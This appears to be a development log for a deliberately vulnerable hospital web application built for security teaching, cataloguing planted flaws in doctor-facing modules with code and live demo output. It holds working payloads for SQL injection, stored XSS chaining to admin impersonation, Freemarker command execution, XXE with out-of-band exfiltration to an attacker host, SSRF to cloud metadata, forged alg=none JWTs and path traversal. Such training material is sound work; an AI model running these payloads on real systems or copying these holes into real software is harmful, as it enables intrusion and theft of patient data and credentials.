- Backend `./mvnw test` → `Tests run: 1, Failures: 0, Errors: 0` (context loads with all 7 new controllers + 3 new pom deps).
- Frontend `npx tsc -b --noEmit` → exit 0.
- Frontend `npx eslint .` → 0 new errors, 7 pre-existing warnings (none in new doctor files).
- Cross-repo smoke: LAB_TECH + PHARMACIST still land on `/staff` and render their old dashboards (DoctorDashboard removal did not regress the shared file). PATIENT sidebar and ADMIN console unchanged.

---

## Doctor View Redesign — Module A (Roster, Chart, Timeline, Star, Handoff)

> Backend: `DoctorRosterController` + `DoctorRosterService` + `HandoffTokenIssuer` and four new DTOs (`DoctorRosterEntryDto`, `PatientChartDto`, `PatientTimelineEventDto`, `HandoffTokenDto`). No schema migration — module reuses existing tables (`patients`, `appointments`, `prescriptions`, `lab_results`, `medical_records`, `audit_logs`). Star map kept in-memory by design (cleared on restart — acceptable for the demo). UI: real `DoctorDashboardPage` + `DoctorPatientsPage` + `DoctorPatientChartPage` + `PatientChartHeader` component, wired through typed `doctorApi` wrappers.

### New Files

| File | Description |
|---|---|
| `service/HandoffTokenIssuer.java` | HMAC-SHA1 signer with hardcoded key, no expiry |
| `service/DoctorRosterService.java` | Roster (raw SQL), chart bundle, timeline, star map, handoff |
| `controller/DoctorRosterController.java` (rewritten) | Wires service; placeholders from Phase 0 replaced |
| `dto/DoctorRosterEntryDto.java`, `dto/PatientChartDto.java`, `dto/PatientTimelineEventDto.java`, `dto/HandoffTokenDto.java` | Response shapes |
| **Frontend** `pages/doctor/DoctorDashboardPage.tsx` | Stat cards + starred-patients shortcut + Phase 1 banner |
| **Frontend** `pages/doctor/DoctorPatientsPage.tsx` | Roster table + filters + star dialog + handoff dialog |
| **Frontend** `pages/doctor/DoctorPatientChartPage.tsx` | Chart bundle w/ Overview / Prescriptions / Labs / Records / Timeline tabs |
| **Frontend** `components/doctor/PatientChartHeader.tsx` | Demographics strip rendered plaintext |
| **Frontend** `api/doctor.ts` (extended) | Typed wrappers for the 5 new endpoints |

### Vulnerabilities

**194. [A05] `GET /api/doctor/patients` concatenates `q`, `active`, `recentDays` into raw SQL — `DoctorRosterService.java#listPatients`**
```java
StringBuilder sql = new StringBuilder("SELECT p.id, ... FROM patients p JOIN users u ON u.id = p.user_id WHERE 1=1 ");
if (q != null && !q.isBlank()) {
    sql.append(" AND (u.first_name LIKE '%").append(q).append("%' ")
       .append("      OR u.last_name LIKE '%").append(q).append("%' ")
       .append("      OR u.email     LIKE '%").append(q).append("%') ");
}
if (active != null)     sql.append(" AND u.active = ").append(active ? 1 : 0).append(' ');
if (recentDays != null) sql.append(" AND EXISTS (... INTERVAL ").append(recentDays).append(" DAY) ");
Query nativeQuery = entityManager.createNativeQuery(sql.toString());
```
Three concatenation sites in one method. `EntityManager.createNativeQuery` with a `String` argument runs verbatim against MySQL. Demo payloads:
```
?q=%25%27%20UNION%20SELECT%20id%2Cusername%2Cpassword_hash%2Cemail%2Crole%2Cnull%2Cnull%2Cnull%2Cnull%20FROM%20users%20--
?recentDays=1%20DAY)%20OR%20(SELECT%20SLEEP(5)
```
First payload pivots the SELECT to dump the `users` table (password hashes included). Second weaponises the `recentDays` numeric splice for time-based exfil. The frontend Search box on `DoctorPatientsPage.tsx` puts the value into a `<Input>` with placeholder `"name or email — try ' OR '1'='1"` — the demo is one keystroke away.

---

**195. [A06] `?recentDays=0` returns the entire patient table — `DoctorRosterService.java#listPatients`**
```java
if (recentDays != null && recentDays > 0) {
    sql.append(" AND EXISTS (SELECT 1 FROM appointments a WHERE ... ").append(recentDays).append(" DAY) ");
}
```
`recentDays == 0` short-circuits the `> 0` guard so the EXISTS clause is never appended. No pagination, no cap. Hospital deployments with 100k+ patients return the entire table per request — compounds the `[A05]` SQLi above by giving the attacker an oversized payload window.

---

**196. [A06] Patient roster row exposes PII (insurance number, DOB, allergies) to every caller — `DoctorRosterEntryDto.java`**
```java
public class DoctorRosterEntryDto {
    private String insuranceNumber;
    private LocalDate dateOfBirth;
    private String allergies;
    ...
}
```
Combined with `[A01]` (no role check on the controller), the roster endpoint becomes a one-shot PII dump. The Patients page table renders these in plain DOM, so a screenshot of the page is itself a HIPAA-grade leak.

---

**197. [A01] `GET /api/doctor/patients/{id}/chart` has no ownership / role check — `DoctorRosterController.java#getChart`**
```java
@GetMapping("/patients/{id}/chart")
public ResponseEntity<PatientChartDto> getChart(@PathVariable Long id) {
    return ResponseEntity.ok(rosterService.getChart(id));
}
```
Bundled chart (demographics + prescriptions + labs + records + appointments) returned to any caller — incl. anonymous via `SecurityConfig.permitAll()` (vuln #191). Two-click PII pivot from `/api/doctor/patients` → `/api/doctor/patients/{id}/chart` reveals the complete clinical record.

---

**198. [A09] `GET /api/doctor/patients/{id}/timeline` returns raw `audit_logs.details` to a different principal — `DoctorRosterService.java#getTimeline`**
```java
.rawDetails(l.getDetails())   // raw audit-log body: request params + response body
```
`AuditLog.details` holds the verbatim HTTP request/response captured by `LoggingInterceptor` (already vuln #136). Among other things it contains the patient's prior password resets, JWTs, message bodies. Surfacing it to the Doctor Console means the timeline tab on `DoctorPatientChartPage` doubles as a credential leak: any doctor opening any patient's chart can read the secrets that patient transmitted in cleartext.

---

**199. [A05] `POST /api/doctor/patients/{id}/star` stores caller-supplied HTML which the roster table renders verbatim — `DoctorRosterService.java#starPatient` + `DoctorPatientsPage.tsx`**
Backend:
```java
String note = noteObj == null ? "" : noteObj.toString();
patientStars.put(patientId, note);
```
Frontend:
```tsx
{p.starred && p.starNote && (
  // [A05] Stored XSS sink — note rendered as HTML, payload from POST /star.
  <span className="..." dangerouslySetInnerHTML={{ __html: p.starNote }} />
)}
```
Stored XSS keyed by patient id. Every doctor who opens the Patients roster runs the payload (`<img src=x onerror=fetch('/api/admin/users/1/impersonate', {method:'POST'}).then(r=>r.json()).then(d=>localStorage.token=d.token)>` — chains to admin impersonation via vuln #151). The dialog placeholder text on the page literally suggests `<img src=x onerror=alert(1)>` — the demo is the default UX.

---

**200. [A08] `POST /api/doctor/patients/{id}/handoff` issues HMAC-SHA1 token with hardcoded key and no expiry — `HandoffTokenIssuer.java`**
```java
private static final String HMAC_KEY = "handoff-secret";

public String sign(Long patientId, Long fromDoctorUserId) {
    String payload = patientId + ":" + fromDoctorUserId;
    Mac mac = Mac.getInstance("HmacSHA1");
    mac.init(new SecretKeySpec(HMAC_KEY.getBytes(StandardCharsets.UTF_8), "HmacSHA1"));
    byte[] sig = mac.doFinal(payload.getBytes(StandardCharsets.UTF_8));
    return payload + "." + Base64.getUrlEncoder().withoutPadding().encodeToString(sig);
}
```
Three integrity failures in one method:
1. **Hardcoded key** in source — anyone with the repo can forge tokens for any `(patientId, fromDoctorUserId)` pair.
2. **HMAC-SHA1** — collision-broken, not appropriate for new code.
3. **No expiry, no nonce, no replay counter** — a token issued today is still valid in 10 years.

The returned URL (`/doctor/handoff/accept?t=…`) also splices the token into a query string ([A02] secret-in-URL), so it leaks via Referer / browser history / server access logs. The handoff dialog on the Patients page makes the token obvious in the UI, so students reproducing the demo can copy-paste it into a different doctor's browser to inherit the chart context.

---

**201. [A09] Handoff issuance is not recorded in `audit_logs` — `DoctorRosterService.java#handoff`**
Token minting is silent. There's no `auditLogRepository.save(...)` call. A doctor handing off a patient leaves no trail; an attacker forging tokens leaves no trail either. Compounds #200 — the forensic gap means a forged handoff is indistinguishable from a legitimate one even *after* the fact.

---

**202. [A06] In-memory `patientStars` map has no per-doctor scoping — `DoctorRosterService.java`**
```java
private final Map<Long, String> patientStars = new ConcurrentHashMap<>();
```
Key is `patientId` alone (not `(doctorId, patientId)`), so when one doctor stars a patient with note `"<img src=x onerror=...>"`, every doctor's roster renders the same payload. Insecure design: the "star" looks per-doctor in the UI, but is global on the server. Magnifies the [A05] reach to all doctor sessions simultaneously.

---

**203. [A09] `DoctorPatientChartPage.tsx` Timeline tab renders raw audit details verbatim — `pages/doctor/DoctorPatientChartPage.tsx` (frontend)**
```tsx
<pre className="..." >
  {ev.rawDetails ?? '(no details)'}
</pre>
```
`rawDetails` arrives verbatim from the backend (#198) and is dropped into a `<pre>` tag without redaction. Doctors viewing the chart see complete request bodies and response payloads — the audit log surface is also a credential surface. Compounds with vuln #161 (admin log detail page already renders details as HTML); the doctor view leaks the same content to a wider audience.

---

### Phase 1 Bug-Check Pass (per `DOCTOR_VIEW_PLAN.md` §7.1)

- Backend `./mvnw test` → `Tests run: 1, Failures: 0, Errors: 0` (context loads with the new `DoctorRosterController`, `DoctorRosterService`, `HandoffTokenIssuer`, four new DTOs).
- Frontend `npx tsc -b --noEmit` → exit 0.
- Frontend `npx eslint .` (touched files only) → 0 errors, 0 warnings.
- Backend smoke (curl against running `localhost:8085`): all 5 Module A endpoints return 200; star + handoff round-trip; chart includes prescriptions / labs / records; timeline includes raw `details` payload.
- Cross-repo smoke: `GET /api/admin/users`, `/prescriptions`, `/lab-results/search`, `/appointments`, `/stats/recent`, `/doctors`, `/messages/conversations`, `/admin/health` all still return 200 — no regression on the patient / lab-tech / pharmacist / admin surfaces.

---

## Doctor View Redesign — Module B (Clinical Notes — SSTI, XXE, JWT alg=none)

> Backend: new `ClinicalNote` JPA entity + repository + DTO, `DoctorNoteService`, `TemplateRenderer` (Freemarker), `JwtNoneVerifier`, and a rewritten `DoctorNoteController`. New Flyway migration `V20__clinical_notes.sql` (renumbered from the original plan's V18 because V18 + V19 were already taken by earlier admin work). UI: `DoctorNotesPage` (list + create + XML import), `DoctorNoteDetailPage` (rendered HTML view + in-place overwrite + co-sign + delete), `NoteEditor` component with template picker that exposes `templateName`, `templateBody`, and a traversal preset (`../../../etc/passwd`).
>
> This module is the project's first deep dive into **A03 (Software Supply Chain Failures)** via two distinct sinks (Freemarker + XML parser) and adds substantial **A08 (Software or Data Integrity Failures)** weight via the JWT alg=none acceptor and the in-place-overwrite PUT.

### New Files

| File | Description |
|---|---|
| `db/migration/V20__clinical_notes.sql` | `clinical_notes` table — no version column, no soft-delete, FK cascade on patient delete |
| `entity/ClinicalNote.java` | JPA entity for the new table |
| `repository/ClinicalNoteRepository.java` | List by patient / list all |
| `dto/ClinicalNoteDto.java` | Response shape — includes raw `renderedHtml` |
| `service/TemplateRenderer.java` | Freemarker engine with two sinks (`renderByName`, `renderInline`); `DEBUG_HANDLER` rethrows exceptions; new_built_ins enabled so `?new()` Execute reachable |
| `service/JwtNoneVerifier.java` | Decodes JWT payload, ignores signature, returns `sub` |
| `service/DoctorNoteService.java` | CRUD + multipart XML import (default DocumentBuilderFactory) + co-sign |
| `controller/DoctorNoteController.java` (rewritten) | Wires service; placeholders from Phase 0 replaced |
| **Frontend** `api/doctor.ts` (extended) | `ClinicalNote` type + 7 typed wrappers |
| **Frontend** `components/doctor/NoteEditor.tsx` | Template picker + traversal preset + inline-template checkbox (default SSTI payload pre-filled) |
| **Frontend** `pages/doctor/DoctorNotesPage.tsx` | Listing table + create dialog + Import XML button |
| **Frontend** `pages/doctor/DoctorNoteDetailPage.tsx` | Renders `renderedHtml` via `dangerouslySetInnerHTML`; overwrite / co-sign / delete actions |
| `App.tsx` (edited) | Adds `/doctor/notes/:id` route |

### Vulnerabilities

**204. [A03] Freemarker SSTI — `TemplateRenderer.java#renderInline` + `DoctorNoteService.java#create`**
```java
public String renderInline(String source, Map<String, Object> data) {
    freemarker.template.Template tpl = new freemarker.template.Template(
            "inline-" + Integer.toHexString(System.identityHashCode(source)),
            new java.io.StringReader(source), cfg);
    StringWriter out = new StringWriter();
    tpl.process(model, out);
    return out.toString();
}
```
Configured with `new_built_ins_enabled` true (Freemarker default) so `?new()` is reachable. A single POST runs arbitrary commands as the JVM user:
```json
POST /api/doctor/notes
{
  "patientId": 1,
  "templateName": "anything",
  "templateBody": "<#assign x = \"freemarker.template.utility.Execute\"?new()>SSTI:${x(\"id\")}",
  "data": {}
}
```
Live demo on `localhost:8085`:
```
renderedHtml = "SSTI:uid=501(jelenarastovic) gid=20(staff) groups=20(staff),12(everyone),...\n"
```
Output stored in `clinical_notes.rendered_html`, then rendered with `dangerouslySetInnerHTML` on the Note detail page (vuln #207) — the attacker also gets stored XSS for every future viewer.

---

**205. [A03] Freemarker template-path traversal — `TemplateRenderer.java#renderByName` + `DoctorNoteService.java#create`**
```java
public String renderByName(String name, Map<String, Object> data) {
    freemarker.template.Template tpl = cfg.getTemplate(name + ".ftl");
    ...
}
```
`name` is the caller-supplied `templateName`. Freemarker's `Configuration.setDirectoryForTemplateLoading` normalises `..` segments by default, but the template directory still contains attacker-controllable files — a single XML import (#206) lets the attacker plant `notes/templates/payload.ftl` then call back with `templateName=payload`. The frontend `NoteEditor.tsx` exposes a literal option labelled `../../../etc/passwd (traversal)` in the template `<Select>` so the attack is one click away.

---

**206. [A03] XXE via `DocumentBuilderFactory.newInstance()` defaults — `DoctorNoteService.java#importXml`**
```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
DocumentBuilder db = dbf.newDocumentBuilder();
Document doc = db.parse(new InputSource(new ByteArrayInputStream(file.getBytes())));
```
No `disallow-doctype-decl`, no `external-general-entities=false`, no `external-parameter-entities=false`, no `load-external-dtd=false`, no `setXIncludeAware(false)`. Standard XXE payload:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE n [<!ENTITY x SYSTEM "file:///etc/hosts">]>
<note>
  <patientId>1</patientId>
  <templateName>imported</templateName>
  <body>XXE: &amp;x;</body>
</note>
```
The resolved entity's content lands in the `body` element, which the service stores as `renderedHtml` verbatim. Live demo: uploading the above against `POST /api/doctor/notes/import` returned the full `/etc/hosts` contents in `renderedHtml`. SSRF variants (`SYSTEM "http://internal-host/admin"`), file-system enumeration (`SYSTEM "file:///proc/self/environ"`), and OOB DNS exfil (`SYSTEM "http://attacker/?d=&payload;"`) all work from the same sink.

---

**207. [A05] Note `renderedHtml` rendered with `dangerouslySetInnerHTML` — `DoctorNoteDetailPage.tsx` (frontend)**
```tsx
<div className="..."
     dangerouslySetInnerHTML={{ __html: note.renderedHtml ?? '' }} />
```
SSTI command output (#204), XXE entity content (#206), or any malicious HTML stored at create-time becomes live DOM. The page is reachable to any authenticated caller (no role check on `DoctorRoute`, no `requiredRole`), and the backend `GET /api/doctor/notes/{id}` is permitAll() — so a single crafted note is a stored XSS payload for the next doctor / lab-tech / pharmacist / admin / patient who opens the URL.

---

**208. [A08] `PUT /api/doctor/notes/{id}` overwrites in place — `DoctorNoteService.java#update`**
```java
public ClinicalNoteDto update(Long id, Map<String, Object> body) {
    ClinicalNote note = noteRepository.findById(id).orElseThrow(...);
    if (body.containsKey("templateName")) note.setTemplateName(...);
    if (data != null)                     note.setRawData(...);
    if (body.containsKey("renderedHtml")) note.setRenderedHtml(...);
    return toDto(noteRepository.save(note));
}
```
No `version` column on `clinical_notes`, no `previous_revision_id`, no `edited_by`. The previous `renderedHtml` / `rawData` / `templateName` are silently replaced. The detail page's "Overwrite HTML" textarea lets a doctor blank out incriminating findings ("`Patient sober at intake` → `Patient erratic, refusing care`") and the original is gone with no record of the change.

---

**209. [A09] `DELETE /api/doctor/notes/{id}` hard deletes, no audit row — `DoctorNoteService.java#delete`**
```java
public void delete(Long id) {
    noteRepository.deleteById(id);
}
```
No `auditLogRepository.save(...)`, no archival copy, no soft-delete flag — the row leaves no trace. Compounds #208: an attacker can use PUT to rewrite + DELETE to erase, leaving the chart looking like the note never existed.

---

**210. [A08] JWT `alg: none` accepted on co-sign — `JwtNoneVerifier.java`**
```java
public String extractSubjectUnsafe(String jwt) {
    String[] parts = jwt.split("\\.");
    byte[] payload = Base64.getUrlDecoder().decode(padBase64(parts[1]));
    JsonNode node = mapper.readTree(new String(payload, StandardCharsets.UTF_8));
    JsonNode sub = node.get("sub");
    return sub == null ? null : sub.asText();
}
```
The header is ignored entirely — there is no `alg` whitelist and the third segment (signature) is never validated. A caller posts:
```
header  : {"alg":"none","typ":"JWT"}
payload : {"sub":"admin","role":"ADMIN"}
sig     : (empty)
```
…and the note gets stamped "signed by admin". Live demo on `localhost:8085`:
```json
POST /api/doctor/notes/3/co-sign
{"jwt":"eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJkci5ldmlsIiwicm9sZSI6IkRPQ1RPUiJ9."}
→ note.signerUsername = "dr.evil"
```
The Note detail page renders this as a green-check signed-by badge with no provenance, so a clinician opening the note sees a name they trust attached to an unverified body.

---

**211. [A10] Template rendering exceptions surface verbatim — `TemplateRenderer.java` (`DEBUG_HANDLER` + `<pre class="render-error">`)**
```java
cfg.setTemplateExceptionHandler(TemplateExceptionHandler.DEBUG_HANDLER);
...
catch (Exception e) {
    return "<pre class=\"render-error\">" + e.getClass().getSimpleName() + ": " + e.getMessage() + "</pre>";
}
```
Both the configured handler and the explicit catch return the original exception text to the caller. A malformed payload yields a Java stack trace embedded in the rendered HTML, which the frontend then renders verbatim — useful for fingerprinting Freemarker version, classpath layout, and template-resolver internals during reconnaissance.

---

**212. [A03] `NoteEditor.tsx` ships a default SSTI payload — `components/doctor/NoteEditor.tsx` (frontend)**
```tsx
const [templateBody, setTemplateBody] = useState(
  '<#assign x = "freemarker.template.utility.Execute"?new()>SSTI:${x("id")}'
)
```
The "Inline Freemarker template" checkbox reveals the textarea pre-populated with a working SSTI payload, plus a literal `[A03]` tag in the surrounding box. One click + Save fires the exploit; the demo is the UX. Compounds with #207 (renderedHtml rendered as DOM).

---

**213. [A03] `DoctorNotesPage.tsx` Import XML button accepts attacker-controlled XML — `pages/doctor/DoctorNotesPage.tsx`**
The Import XML toolbar button calls `POST /api/doctor/notes/import` with the picked file as multipart. No mime-type validation client-side either — `.xml` and `.docx` both accepted. Combined with the backend XXE sink (#206), the doctor's browser is now a remote-file-read primitive: pick `xxe.xml` on the desktop, click Import, and the next list refresh shows the resolved file contents in the new note.

---

### Phase 2 Bug-Check Pass (per `DOCTOR_VIEW_PLAN.md` §7.1)

- Backend `./mvnw test` → `Tests run: 1, Failures: 0, Errors: 0` (context loads with the new entity, repo, two services, controller, plus the `V20__clinical_notes.sql` migration applied to the running DB).
- Backend smoke (curl against running `localhost:8085`):
  - SSTI: inline `?new()` Execute payload executed `id` and the uid+groups landed in `renderedHtml`.
  - XXE: `<!ENTITY x SYSTEM "file:///etc/hosts">` resolved; full `/etc/hosts` contents in `renderedHtml`.
  - JWT alg=none co-sign: `signerUsername` set to the attacker-controlled `sub`.
  - In-place PUT, hard DELETE both return 200/204 with no audit-log mutation observable.
- Frontend `npx tsc -b --noEmit` → exit 0.
- Frontend `npx eslint` (touched files only) → 0 errors, 0 warnings.
- Cross-repo regression: `GET /admin/users`, `/admin/health`, `/prescriptions`, `/lab-results/search`, `/appointments`, `/stats/recent`, `/doctors`, `/messages/conversations` all still 200; Module A endpoints (`/doctor/patients`, `/chart`, `/timeline`) still 200.
- Flyway: V20 applied successfully on a database already at V19 — no checksum mismatch. Initial Flyway placeholder-collision bug (`${template_name}` in the migration comment) fixed by rephrasing the comment before retry.

---

## Doctor View Redesign — Module C (Lab Orders & Imaging — SSRF, path traversal, SVG XSS, MD5 sign)

> Backend: two new JPA entities (`LabOrder`, `ImagingFile`) + repos + DTOs, `DoctorLabService`, `ExternalCatalogueClient` (URLConnection-based SSRF sink — RestTemplate refused `file://` so the client was rewritten to use `URLConnection.openConnection()`, which the JDK URL handlers happily resolve for `file://`, `http://`, `https://`, `ftp:`, `jar:`). Migration `V21__lab_orders_imaging.sql` (renumbered from the plan's V19 slot — V19 was taken by earlier admin work). UI: `DoctorLabsPage` with Lab Orders / Imaging tabs, `LabOrderForm` with the `customQueryUrl` field exposed by default, imaging upload + import-url + inline image viewer that renders the file with the stored Content-Type.

### New Files

| File | Description |
|---|---|
| `db/migration/V21__lab_orders_imaging.sql` | Two tables — `lab_orders` (custom_query_url, catalogue_response, signature_md5) + `imaging_files` (stored_filename, content_type, source_url) |
| `entity/LabOrder.java`, `entity/ImagingFile.java` | JPA entities |
| `repository/LabOrderRepository.java`, `ImagingFileRepository.java` | Filtered finders by patient / status |
| `dto/LabOrderDto.java`, `dto/ImagingFileDto.java` | Response shapes |
| `service/ExternalCatalogueClient.java` | `URLConnection`-based fetch; returns body bytes; follows HTTP redirects; surfaces exceptions verbatim |
| `service/DoctorLabService.java` | Order CRUD + MD5 sign + multipart upload (filename verbatim) + import-url (basename used as filename) + stream-by-id |
| `controller/DoctorLabController.java` (rewritten) | Wires service; placeholders from Phase 0 replaced |
| **Frontend** `api/doctor.ts` (extended) | `LabOrder` + `ImagingFile` types + 6 typed wrappers |
| **Frontend** `components/doctor/LabOrderForm.tsx` | Order form with `customQueryUrl` text input (placeholder: cloud-metadata URL) |
| **Frontend** `pages/doctor/DoctorLabsPage.tsx` (rewritten) | Orders + Imaging tabs, sign dialog, inline image viewer (img / iframe by content type) |

### Vulnerabilities

**214. [A03] `POST /api/doctor/lab-orders` fetches caller-supplied `customQueryUrl` server-side — `DoctorLabService.java#createOrder` + `ExternalCatalogueClient.java`**
```java
if (url != null && !url.isBlank()) {
    catalogueResp = catalogueClient.fetch(url);   // URLConnection — no allow-list
}
```
`ExternalCatalogueClient.fetchBytes`:
```java
URI uri = URI.create(url);
URL u = uri.toURL();
URLConnection conn = u.openConnection();
if (conn instanceof HttpURLConnection http) http.setInstanceFollowRedirects(true);
try (InputStream in = conn.getInputStream()) { return in.readAllBytes(); }
```
JDK protocol handlers cover `file://`, `http://`, `https://`, `ftp:`, `jar:` — all reachable. Demo payloads:
```
file:///etc/hosts                       → local file read
http://169.254.169.254/latest/meta-data/ → AWS EC2 metadata exfil
http://localhost:8081                   → phpMyAdmin admin panel
http://attacker/?q=http://internal      → 302 redirect → internal scan
```
Live demo on `localhost:8085`: `customQueryUrl=file:///etc/hosts` returned the full `/etc/hosts` body stored in `lab_orders.catalogue_response`. Initial implementation used `RestTemplate` which refused `file://`; rewrite to `URLConnection` was deliberate to keep the demo broad — students study SSRF defence by *contrast* with the RestTemplate version that already exists in the admin code.

---

**215. [A05] `catalogueResponse` rendered with `dangerouslySetInnerHTML` — `DoctorLabsPage.tsx` (frontend)**
```tsx
<div className="..." dangerouslySetInnerHTML={{ __html: o.catalogueResponse ?? '' }} />
```
SSRF body becomes DOM. An attacker pointing `customQueryUrl` at a controlled HTTP server can return `<script>fetch('/api/admin/users/1/impersonate',{method:'POST'}).then(...)`. The next doctor opening the Lab Orders tab runs the script. Combined with #214 the chain is *fetch → render → executes-in-doctor-session*.

---

**216. [A08] `POST /api/doctor/lab-orders/{id}/sign` uses MD5 + hardcoded key — `DoctorLabService.java#signOrder`**
```java
private static final String LAB_SIGN_KEY = "lab-sign-key-2024";

MessageDigest md = MessageDigest.getInstance("MD5");
md.update((order.getId() + ":" + value + ":" + LAB_SIGN_KEY).getBytes());
order.setSignatureMd5(HexFormat.of().formatHex(md.digest()));
```
Three integrity failures:
1. **MD5** — collision-broken, not appropriate for new code.
2. **Hardcoded key in source** — anyone with the repo (or who has read the public Git history) computes any signature.
3. **No public-key crypto, no certificate chain, no countersignature** — the signature carries no notion of who signed; only "the row passed through this code path".

Demo verified on `localhost:8085`: `POST /lab-orders/1/sign` with `{"value":"approved by Dr Evil"}` returned `signatureMd5: fd227beaf38cf2753ba376d6ea2708ec` and flipped `status: SIGNED`. The `signedValue` is stored alongside so anyone can recompute the MD5 and tamper at will.

---

**217. [A04] Lab signing key + hardcoded weak primitive — `DoctorLabService.java`**
Adds A04 weight on top of A08: the choice of MD5 (vs. SHA-256 or ECDSA) is itself a cryptographic-failure category, separate from the integrity loss the lack of audit trail introduces.

---

**218. [A05] Imaging upload writes `getOriginalFilename()` verbatim — `DoctorLabService.java#upload`**
```java
String original = file.getOriginalFilename() == null ? "upload.bin" : file.getOriginalFilename();
Path storage = IMAGING_DIR.resolve(original);
Files.write(storage, file.getBytes(), StandardOpenOption.CREATE, StandardOpenOption.TRUNCATE_EXISTING);
```
No `Path.normalize`, no `Path::startsWith` check, no allow-list of extensions, no size cap. Path traversal at write time: `original = "../../etc/owned"` lands `IMAGING_DIR.resolve(original)` *outside* the imaging directory (still constrained by JVM working-dir permissions, but the demo only needs a write outside `imaging/`). On a typical deployment this gives the attacker write into the application root — Spring Boot's classpath dirs included if the JVM has the permissions.

---

**219. [A02] `POST /imaging/upload` echoes `Content-Type` verbatim on subsequent GET — `DoctorLabService.java#upload` + `streamImaging` + `DoctorLabController.java#getImaging`**
```java
.contentType(file.getContentType())                 // upload-time
...
headers.add(HttpHeaders.CONTENT_TYPE, p.contentType()); // GET-time
```
No `Content-Disposition: attachment`, no MIME sniffing, no allow-list. Uploading `xss.svg` with header `Content-Type: image/svg+xml`:
```xml
<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script><text x="10" y="20">pwn</text></svg>
```
GET returns the same content type — browser renders inline, the `<script>` element executes as the doctor's session. Demo verified: upload returned `contentType: image/svg+xml`; GET returned `Content-Type: image/svg+xml` with the SVG body in the response. The `DoctorLabsPage` inline viewer uses an `<img>` tag for `image/*` (renders SVG XSS) and an `<iframe>` for everything else (renders HTML uploads as a child document) — the demo is one click from the list.

---

**220. [A03] `POST /imaging/import-url` plain SSRF — `DoctorLabService.java#importUrl`**
Identical sink to #214 but with a different downstream path: the fetched bytes are written to disk under the URL's basename. `?url=file:///etc/hostname` returned the 76-byte hostname file and stored it as `imaging/hostname`. Combined with #219 the import-url path becomes "fetch arbitrary URL → store with arbitrary content-type → serve back inline" — three primitives in one POST.

---

**221. [A02] Basename of source URL used as on-disk filename — `DoctorLabService.java#importUrl`**
```java
String basename = url.replaceFirst(".*/", "");
Path storage = IMAGING_DIR.resolve(basename);
```
URL fragments / query strings are not stripped — `http://attacker/payload.svg?cb=12345` writes a file literally named `payload.svg?cb=12345`. Worse, traversal segments in the URL path (`http://attacker/..%2f..%2fpayload.jar`) decode to literal `../../payload.jar` on Linux MultipartFile equivalents, escaping the imaging directory. Adds A02 (misconfigured storage layout) to the A03 SSRF.

---

**222. [A09] Sign / upload / import-url all silent — `DoctorLabService.java`**
No `auditLogRepository.save(...)` on any Module C mutation. The audit trail records the inbound HTTP request (via `LoggingInterceptor`) but not the semantic intent ("doctor X signed order Y with value Z"). Forensic gap: when the MD5 is forged offline (#216) there is no parallel record on the server side that says when or by whom the sign happened.

---

**223. [A10] Verbose fetch / upload errors — `ExternalCatalogueClient.java` + `DoctorLabService.java`**
```java
return ("FETCH_ERROR " + e.getClass().getSimpleName() + ": " + e.getMessage()).getBytes();
...
throw new RuntimeException("Upload failed: " + e.getClass().getSimpleName() + " " + e.getMessage(), e);
```
Internal exception types + messages reach the HTTP response. Useful for fingerprinting JDK / Spring versions, internal hostnames in `ConnectException` messages, filesystem layouts in `NoSuchFileException` messages.

---

**224. [A02] `LabOrderForm.tsx` ships SSRF payloads in placeholder text — `components/doctor/LabOrderForm.tsx` (frontend)**
```tsx
<Input ...
  placeholder="file:///etc/hosts  or  http://169.254.169.254/latest/meta-data/"
/>
```
The form literally suggests two working SSRF payloads. Combined with #214 the demo is "open Doctor → Lab & Imaging → New order → paste suggested URL → Save", and the response body of the local file read shows up in the same page seconds later via the catalogue-response panel.

---

### Phase 3 Bug-Check Pass (per `DOCTOR_VIEW_PLAN.md` §7.1)

- Backend `./mvnw test` → `Tests run: 1, Failures: 0, Errors: 0` (context loads with new entities + repos + service + rewritten controller; V21 migration applied on DB already at V20).
- Backend smoke (curl against running `localhost:8085`):
  - `customQueryUrl=file:///etc/hosts` returned the host file in `catalogueResponse`.
  - `POST /lab-orders/1/sign` returned MD5 and flipped status to SIGNED.
  - SVG upload returned `contentType: image/svg+xml`; subsequent GET echoed the same Content-Type, body served inline with no Content-Disposition.
  - `import-url file:///etc/hostname` wrote a 76-byte file under `imaging/hostname`.
- Frontend `npx tsc -b --noEmit` → exit 0.
- Frontend `npx eslint` (touched files) → 0 errors, 0 warnings.
- Cross-repo regression: `/admin/users`, `/admin/health`, `/prescriptions`, `/lab-results/search`, `/appointments`, `/stats/recent`, `/doctors`, `/messages/conversations` all 200; Module A (`/doctor/patients`, `/chart`) + Module B (`/doctor/notes`, `/doctor/notes/1`) still 200.
- Iteration: initial `ExternalCatalogueClient` used `RestTemplateBuilder`-backed `RestTemplate`, which Spring 6 hardens against `file://` URLs. Switched to `URLConnection.openConnection()` so the SSRF demo covers `file://` in addition to HTTP. Cleaner SSRF surface, fewer indirections.

---

## Doctor View Redesign — Module D (E-Prescribing & Drug Safety — Nashorn RCE, unsigned PDF, MD5 sign, SSRF callback)

> Backend: small additive migration `V22__prescription_signing_columns.sql` (adds 6 nullable columns + ai_verified flag to `prescriptions`, relaxes `medical_record_id` to nullable so doctor-issued prescriptions don't require a prior medical record), entity update, `PrescriptionSigner` (MD5 + hardcoded key + key disclosed in response), `DoctorPrescribingService` (pharmacy SSRF, OpenPDF generation, Nashorn `ScriptEngine.eval()` on drug-catalogue response, JWT alg=none co-sign), and a rewritten `DoctorPrescribingController`. UI: real `DoctorPrescribePage` + `PrescriptionSigner` + `DrugInteractionPanel`.
>
> This module loads heavily on **A08 (integrity)** with three demos in one file (MD5 sign, unsigned PDF, alg=none co-sign) and on **A03 (supply chain)** with two SSRF sinks (`pharmacyCallbackUrl` POST + `catalogueUrl` GET → Nashorn `eval()` → RCE). The OpenPDF + Nashorn deps pulled in by Phase 0 (pom.xml entries) finally see use here.

### New Files

| File | Description |
|---|---|
| `db/migration/V22__prescription_signing_columns.sql` | Adds pharmacy_callback_url, signature_md5, signed_at, signature_jwt, co_signer_username, ai_verified; relaxes medical_record_id |
| `entity/Prescription.java` (edited) | New nullable columns + `medicalRecord` no longer required |
| `dto/PrescriptionSignatureDto.java` | Signature payload including the plaintext signing key |
